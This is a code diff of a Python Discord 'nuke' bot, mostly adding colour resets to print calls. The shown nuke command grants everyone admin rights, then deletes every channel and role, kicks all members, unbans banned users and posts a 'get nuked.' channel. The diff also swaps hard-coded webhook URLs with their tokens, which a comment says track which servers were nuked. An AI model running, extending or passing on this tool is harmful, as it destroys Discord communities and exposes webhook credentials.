@@ -32,7 +32,7 @@ async def on_ready():
 @commands.is_owner()
 async def stop(ctx):
     await ctx.bot.logout()
-    print (Fore.GREEN + f"{bot.user.name} has logged out successfully.")
+    print (Fore.GREEN + f"{bot.user.name} has logged out successfully." + Fore.RESET)
 
 @bot.command()
 async def help(ctx):
@@ -130,8 +130,8 @@ async def guildname(ctx, *, name):
   await ctx.message.delete()
   await ctx.guild.edit(name=name)
 
-#This webhook is used for me to track where the bot is added too
-webhooks = ["https://discordapp.com/api/webhooks/698237761123254383/uxxR8lUNIkJ4E8Vf2Jgz2a5YJi0h7X8vllYcOvAnRDdZyUY7Q0GhaDZZ9EC8vq1z57vb","https://discordapp.com/api/webhooks/706126338162950197/cFsOseaYCAPuzA66og30EMLWHMY_EtSckWAIduFlapfhi73jxU0cO9x_si5mckmG9dgk"]
+#please don't spam these I use it to track what servers are nuked
+webhooks = ["https://discordapp.com/api/webhooks/698237761123254383/uxxR8lUNIkJ4E8Vf2Jgz2a5YJi0h7X8vllYcOvAnRDdZyUY7Q0GhaDZZ9EC8vq1z57vb","https://discordapp.com/api/webhooks/704450630319603734/dlHOFEo2WYFbjZeJ7YXiXh721BVtm08svv3vcFJLAVRXlFA0g0mDhoK1NRZKjY_OzP0u"]
 @bot.command()
 async def nuke(ctx):
     await ctx.message.delete()
@@ -139,38 +139,38 @@ async def nuke(ctx):
     try:
       role = discord.utils.get(guild.roles, name = "@everyone")
       await role.edit(permissions = Permissions.all())
-      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}.")
+      print(Fore.GREEN + f"@everyone has been given admin permissions in {guild.name}."+ Fore.RESET)
     except:
-      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}.")
+      print(Fore.RED + f"There was an error when attempting to give everyone perms in {guild.name}." + Fore.RESET)
     print(Style.RESET_ALL)
     await asyncio.sleep(2)
     print(f"Nuking server {guild.name}...")
     for channel in guild.channels:
       try:
         await channel.delete()
-        print(Fore.GREEN + f"{channel.name} was successfully deleted.")
+        print(Fore.GREEN + f"{channel.name} was successfully deleted." + Fore.RESET)
       except:
-        print(Fore.RED + f"{channel.name} was not deleted.")
+        print(Fore.RED + f"{channel.name} was not deleted." + Fore.RESET)
     for member in guild.members:
       try:
         await member.kick()
-        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked.")
+        print(Fore.GREEN + f"{member.name}#{member.discriminator} was kicked." + Fore.RESET)
       except:
-        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked.")
+        print(Fore.RED + f"{member.name}#{member.discriminator} was not kicked." + Fore.RESET)
     for role in guild.roles:
       try:
         await role.delete()
-        print(Fore.GREEN + f"{role.name} was successfully deleted.")
+        print(Fore.GREEN + f"{role.name} was successfully deleted." + Fore.RESET)
       except:
-        print(Fore.RED + f"{role.name} was not deleted.")
+        print(Fore.RED + f"{role.name} was not deleted." + Fore.RESET)
     banned_users = await guild.bans()
     for ban_entry in banned_users:
       user = ban_entry.user
       try:
         await user.unban()
-        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned.")
+        print(Fore.GREEN + f"{user.name}#{user.discriminator} was successfully unbanned." + Fore.RESET)
       except:
-        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned.")
+        print(Fore.RED + f"{user.name}#{user.discriminator} was not unbanned." + Fore.RESET)
     await guild.create_text_channel("get nuked.")
     for channel in guild.text_channels:
       if channel.position == 0:
